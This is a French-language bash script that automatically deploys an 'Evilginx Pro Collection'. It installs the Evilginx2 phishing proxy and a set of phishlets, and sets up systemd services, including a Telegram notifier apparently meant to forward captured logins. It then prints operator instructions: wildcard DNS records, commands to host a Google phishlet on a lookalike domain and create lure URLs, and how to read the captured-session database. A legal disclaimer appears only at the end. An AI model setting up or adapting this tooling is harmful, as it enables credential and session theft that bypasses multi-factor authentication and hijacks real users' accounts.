#!/bin/bash
# =============================================================================
# SCRIPT DE DÉPLOIEMENT RAPIDE - EVILGINX PRO COLLECTION
# =============================================================================
# Usage: curl -sSL https://raw.githubusercontent.com/VOTRE_USERNAME/evilginx-pro-collection/main/scripts/quick_deploy.sh | bash
# =============================================================================

set -e

# Couleurs
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Banner
clear
echo -e "${BLUE}"
cat << "EOF"
╔═══════════════════════════════════════════════════════════╗
║                                                           ║
║     ███████╗██╗   ██╗██╗██╗      ██████╗ ██╗███╗   ██╗  ║
║     ██╔════╝██║   ██║██║██║     ██╔════╝ ██║████╗  ██║  ║
║     █████╗  ██║   ██║██║██║     ██║  ███╗██║██╔██╗ ██║  ║
║     ██╔══╝  ╚██╗ ██╔╝██║██║     ██║   ██║██║██║╚██╗██║  ║
║     ███████╗ ╚████╔╝ ██║███████╗╚██████╔╝██║██║ ╚████║  ║
║     ╚══════╝  ╚═══╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝╚═╝  ╚═══╝  ║
║                                                           ║
║            PRO COLLECTION - AUTO DEPLOYMENT              ║
║                                                           ║
╚═══════════════════════════════════════════════════════════╝
EOF
echo -e "${NC}"

echo ""
echo -e "${GREEN}🚀 Démarrage de l'installation automatique...${NC}"
echo ""

# Vérification des prérequis
echo -e "${YELLOW}[ÉTAPE 1/9] Vérification des prérequis...${NC}"

if [ "$EUID" -ne 0 ]; then 
    echo -e "${RED}❌ Ce script doit être exécuté en tant que root${NC}"
    echo "   Utilisez: sudo bash $0"
    exit 1
fi

# Détection de l'OS
if [ -f /etc/os-release ]; then
    . /etc/os-release
    OS=$NAME
    VER=$VERSION_ID
else
    echo -e "${RED}❌ Système d'exploitation non supporté${NC}"
    exit 1
fi

echo -e "${GREEN}✓ OS détecté: $OS $VER${NC}"

# Variables
INSTALL_DIR="/opt/evilginx-pro-collection"
EVILGINX_DIR="/opt/evilginx2"
PHISHLETS_DIR="/root/.evilginx/phishlets"
REPO_URL="https://github.com/VOTRE_USERNAME/evilginx-pro-collection.git"

# Mise à jour du système
echo ""
echo -e "${YELLOW}[ÉTAPE 2/9] Mise à jour du système...${NC}"
apt update -qq
apt upgrade -y -qq
echo -e "${GREEN}✓ Système à jour${NC}"

# Installation des dépendances de base
echo ""
echo -e "${YELLOW}[ÉTAPE 3/9] Installation des dépendances...${NC}"
apt install -y -qq \
    git \
    wget \
    curl \
    build-essential \
    python3 \
    python3-pip \
    python3-venv \
    screen \
    htop \
    ufw \
    sqlite3 \
    > /dev/null 2>&1

echo -e "${GREEN}✓ Dépendances installées${NC}"

# Installation de Go
echo ""
echo -e "${YELLOW}[ÉTAPE 4/9] Installation de Go...${NC}"

if command -v go &> /dev/null; then
    echo -e "${GREEN}✓ Go déjà installé ($(go version))${NC}"
else
    GO_VERSION="1.22"
    cd /tmp
    wget -q "https://go.dev/dl/go${GO_VERSION}.linux-amd64.tar.gz"
    tar -C /usr/local -xzf "go${GO_VERSION}.linux-amd64.tar.gz"
    rm "go${GO_VERSION}.linux-amd64.tar.gz"

    # Configure PATH system-wide for all users and current session
    echo "export PATH=\$PATH:/usr/local/go/bin" > /etc/profile.d/go.sh
    chmod +x /etc/profile.d/go.sh
    export PATH=$PATH:/usr/local/go/bin

    echo -e "${GREEN}✓ Go ${GO_VERSION} installé${NC}"
fi

# Installation d'Evilginx2
echo ""
echo -e "${YELLOW}[ÉTAPE 5/9] Installation d'Evilginx2...${NC}"

if [ -d "$EVILGINX_DIR" ]; then
    echo -e "${BLUE}⚠ Evilginx2 déjà présent, mise à jour...${NC}"
    cd $EVILGINX_DIR
    git pull -q
else
    git clone -q https://github.com/kgretzky/evilginx2.git $EVILGINX_DIR
fi

cd $EVILGINX_DIR
go build
chmod +x evilginx

echo -e "${GREEN}✓ Evilginx2 compilé${NC}"

# Clonage de la collection
echo ""
echo -e "${YELLOW}[ÉTAPE 6/9] Téléchargement de la collection...${NC}"

if [ -d "$INSTALL_DIR" ]; then
    echo -e "${BLUE}⚠ Collection déjà présente, mise à jour...${NC}"
    cd $INSTALL_DIR
    git pull -q
else
    git clone -q $REPO_URL $INSTALL_DIR
fi

echo -e "${GREEN}✓ Collection téléchargée${NC}"

# Configuration des phishlets
echo ""
echo -e "${YELLOW}[ÉTAPE 7/9] Configuration des phishlets...${NC}"

mkdir -p $PHISHLETS_DIR
cp $INSTALL_DIR/phishlets/*.yaml $PHISHLETS_DIR/
chmod 644 $PHISHLETS_DIR/*.yaml

PHISHLET_COUNT=$(ls -1 $PHISHLETS_DIR/*.yaml | wc -l)
echo -e "${GREEN}✓ ${PHISHLET_COUNT} phishlets installés${NC}"

# Configuration Python
echo ""
echo -e "${YELLOW}[ÉTAPE 8/9] Configuration de l'environnement Python...${NC}"

cd $INSTALL_DIR

if [ ! -d ".venv" ]; then
    python3 -m venv .venv
fi

source .venv/bin/activate
pip install --upgrade pip -q
pip install requests -q

echo -e "${GREEN}✓ Environnement Python configuré${NC}"

# Installation des services systemd
echo ""
echo -e "${YELLOW}[ÉTAPE 9/9] Installation des services systemd...${NC}"

# Service Evilginx
cat > /etc/systemd/system/evilginx.service << EOF
[Unit]
Description=Evilginx2 Phishing Framework
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=$EVILGINX_DIR
ExecStart=$EVILGINX_DIR/evilginx -p $PHISHLETS_DIR
Restart=always
RestartSec=10
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
EOF

# Service Telegram Notifier
cat > /etc/systemd/system/telegram_notifier.service << EOF
[Unit]
Description=Evilginx Telegram Notifier
After=network.target evilginx.service

[Service]
Type=simple
User=root
WorkingDirectory=$INSTALL_DIR
ExecStart=$INSTALL_DIR/.venv/bin/python $INSTALL_DIR/scripts/telegram_notifier.py
Restart=always
RestartSec=10
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable evilginx > /dev/null 2>&1
systemctl enable telegram_notifier > /dev/null 2>&1

echo -e "${GREEN}✓ Services systemd installés${NC}"

# Configuration du pare-feu
echo ""
echo -e "${YELLOW}[BONUS] Configuration du pare-feu...${NC}"

if command -v ufw &> /dev/null; then
    ufw --force enable > /dev/null 2>&1
    ufw allow 22/tcp > /dev/null 2>&1
    ufw allow 80/tcp > /dev/null 2>&1
    ufw allow 443/tcp > /dev/null 2>&1
    echo -e "${GREEN}✓ Pare-feu configuré (ports 22, 80, 443 ouverts)${NC}"
else
    echo -e "${YELLOW}⚠ UFW non disponible, configuration manuelle requise${NC}"
fi

# Résumé de l'installation
clear
echo -e "${GREEN}"
cat << "EOF"
╔═══════════════════════════════════════════════════════════╗
║                                                           ║
║              ✅  INSTALLATION TERMINÉE  ✅               ║
║                                                           ║
╚═══════════════════════════════════════════════════════════╝
EOF
echo -e "${NC}"

echo ""
echo -e "${GREEN}🎉 L'installation est terminée avec succès !${NC}"
echo ""

# Afficher les informations système
IP_ADDRESS=$(hostname -I | awk '{print $1}')

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo -e "${BLUE}📊 INFORMATIONS SYSTÈME${NC}"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""
echo -e "  OS              : ${GREEN}$OS $VER${NC}"
echo -e "  Adresse IP      : ${GREEN}$IP_ADDRESS${NC}"
echo -e "  Evilginx        : ${GREEN}$EVILGINX_DIR${NC}"
echo -e "  Collection      : ${GREEN}$INSTALL_DIR${NC}"
echo -e "  Phishlets       : ${GREEN}$PHISHLET_COUNT installés${NC}"
echo ""

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo -e "${BLUE}📝 PROCHAINES ÉTAPES${NC}"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""
echo -e "${YELLOW}1️⃣  CONFIGURER TELEGRAM${NC}"
echo ""
echo "    Éditer le fichier de configuration :"
echo -e "    ${GREEN}nano $INSTALL_DIR/scripts/telegram_notifier.py${NC}"
echo ""
echo "    Modifier ces lignes :"
echo "    • TELEGRAM_BOT_TOKEN = \"VOTRE_TOKEN\""
echo "    • TELEGRAM_CHAT_ID = \"VOTRE_CHAT_ID\""
echo ""
echo "    📱 Créer un bot : Ouvrir @BotFather sur Telegram"
echo "    📱 Obtenir Chat ID : Ouvrir @userinfobot sur Telegram"
echo ""

echo -e "${YELLOW}2️⃣  CONFIGURER DNS${NC}"
echo ""
echo "    Sur votre registrar de domaine :"
echo ""
echo "    Type    Nom    Valeur              TTL"
echo "    ────────────────────────────────────────"
echo -e "    A       @      ${GREEN}$IP_ADDRESS${NC}       300"
echo -e "    A       *      ${GREEN}$IP_ADDRESS${NC}       300"
echo ""

echo -e "${YELLOW}3️⃣  CONFIGURER EVILGINX${NC}"
echo ""
echo "    Lancer Evilginx en mode interactif :"
echo -e "    ${GREEN}cd $EVILGINX_DIR && ./evilginx -p $PHISHLETS_DIR${NC}"
echo ""
echo "    Commandes de base :"
echo "    ──────────────────────────────────────"
echo "    : config domain votre-domaine.com"
echo -e "    : config ip ${GREEN}$IP_ADDRESS${NC}"
echo "    : phishlets hostname google accounts.votre-domaine.com"
echo "    : phishlets enable google"
echo "    : lures create google"
echo "    : lures get-url 0"
echo ""

echo -e "${YELLOW}4️⃣  LANCER LES SERVICES${NC}"
echo ""
echo "    Démarrer Evilginx :"
echo -e "    ${GREEN}systemctl start evilginx${NC}"
echo ""
echo "    Démarrer le notifier Telegram :"
echo -e "    ${GREEN}systemctl start telegram_notifier${NC}"
echo ""
echo "    Vérifier le statut :"
echo -e "    ${GREEN}systemctl status evilginx telegram_notifier${NC}"
echo ""

echo -e "${YELLOW}5️⃣  SURVEILLER LES LOGS${NC}"
echo ""
echo "    Logs Evilginx :"
echo -e "    ${GREEN}journalctl -u evilginx -f${NC}"
echo ""
echo "    Logs Telegram :"
echo -e "    ${GREEN}journalctl -u telegram_notifier -f${NC}"
echo ""

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo -e "${BLUE}📚 DOCUMENTATION${NC}"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""
echo "  Guide complet      : cat $INSTALL_DIR/docs/GUIDE-DEPLOIEMENT-VPS.md"
echo "  Documentation      : cat $INSTALL_DIR/docs/README-CODE-SOURCE.md"
echo "  Index              : cat $INSTALL_DIR/docs/INDEX-COMPLET.md"
echo ""

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo -e "${BLUE}🔧 COMMANDES UTILES${NC}"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""
echo "  Redémarrer Evilginx       : systemctl restart evilginx"
echo "  Arrêter Evilginx          : systemctl stop evilginx"
echo "  Mode interactif           : cd $EVILGINX_DIR && ./evilginx -p $PHISHLETS_DIR"
echo "  Liste des phishlets       : ls -lh $PHISHLETS_DIR"
echo "  Base de données           : sqlite3 /root/.evilginx/data.db"
echo ""

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo -e "${RED}⚠️  AVERTISSEMENT LÉGAL${NC}"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""
echo -e "${RED}Ces outils sont destinés UNIQUEMENT à des tests de sécurité"
echo "autorisés, des exercices red team avec autorisation écrite,"
echo "et la formation en cybersécurité."
echo ""
echo "L'utilisation illégale est strictement interdite et peut"
echo "entraîner des poursuites judiciaires.${NC}"
echo ""

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""
echo -e "${GREEN}🚀 Bon déploiement et tests de sécurité responsables !${NC}"
echo ""
